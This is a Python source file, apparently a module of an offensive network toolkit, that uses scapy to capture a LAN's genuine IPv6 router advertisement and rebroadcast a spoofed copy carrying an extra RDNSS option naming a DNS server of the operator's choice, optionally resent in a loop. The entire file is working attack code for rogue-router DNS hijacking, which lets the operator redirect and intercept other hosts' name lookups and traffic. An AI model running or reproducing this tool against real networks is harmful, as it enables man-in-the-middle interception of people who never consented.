from deadbeef_modules import ipv6module

from scapy.all import *

# advertise a new ipv6 dns server on the net
class ipv6_becomedns_module(ipv6module):
    """
    This Module retrieves the current router information from the network and sends the same
    router advertisement packet out with an additional DNS server attached
    """
    
    def init_module(self):
        self.prompt = self.cc.prompt(self.prompt, "dns advertisement")      
        self.valid_parameters = ["dns", "iface", "loop",  "mac"]
        self.help_parameters['iface'] = "use this interface"
        self.help_parameters['mac'] = "overwrite interface mac address"
        self.help_parameters['loop'] = "send packets every n seconds"
        self.help_parameters['dns'] = "new dns server to advertise on the network"
        self.required_parameters = ["dns", "iface"]

    def help(self):
        print "advertise a new dns server on the net"
        
    def start(self, cmdline):
        conf.iface = self.parameters['iface']
        
        # get current router config
        router_solicitation_pkt = Ether()/IPv6(dst="ff02::1")/ICMPv6ND_RS()
        router_advertisement_pkt = srp1(router_solicitation_pkt, verbose=0, timeout=3)

        if not router_advertisement_pkt:
            self.cc.err("no router found on current network. this is fatal (for now)\n")
            return
            
        self.cc.ok("found router. crafting new router advertisement packet...\n")
        
        # set default parameters if no user value exists        
        # set default mac
        if "mac" in self.parameters.keys():
            mac_address = self.parameters['mac']
        else:
            mac_address = self.__get_mac__(self.parameters['iface'])
            if not mac_address:
                self.cc.err("unable to obtain mac address. use \"mac\" option to specify\n")
                return
        
        eth = router_advertisement_pkt[Ether].copy()
        eth.remove_payload()
        
        ip = router_advertisement_pkt[IPv6].copy()
        ip.remove_payload()
        
        icmp6_ra = router_advertisement_pkt[ICMPv6ND_RA].copy()
        icmp6_ra.remove_payload()
        
        icmp6_prefix = router_advertisement_pkt[ICMPv6NDOptPrefixInfo].copy()
        icmp6_prefix.remove_payload()
        
        icmp6_srcll = router_advertisement_pkt[ICMPv6NDOptSrcLLAddr].copy()
        icmp6_srcll.remove_payload()
        
        # create rdns payload
        # icmp6_rdns = ICMPv6NDOptRDNSS(dns=(self.parameters['dns'], ), len=3)
        icmp6_rdns = ICMPv6NDOptRDNSS(dns=(self.parameters['dns'], ), len=3,  lifetime=600)
        
        pkt = eth/IPv6(src=ip.src,  dst=ip.dst)/ICMPv6ND_RA(chlim=64,O=1)/icmp6_prefix/icmp6_rdns/icmp6_srcll
        
        self.cc.ok("sending fake dns advertisement...\n")
        
        if "loop" not in self.parameters.keys():
            sendp(pkt) 
        else:
            arguments = {'loop': 1, 'inter': int(self.parameters['loop']), 'verbose': 0}
            self.add_job(cmd = sendp, args = (pkt, ), kwargs = arguments)                     

    def stop(self, cmdline):
        self.cc.ok("stopping dns advertisement server...\n")        
        
        self.kill_job()
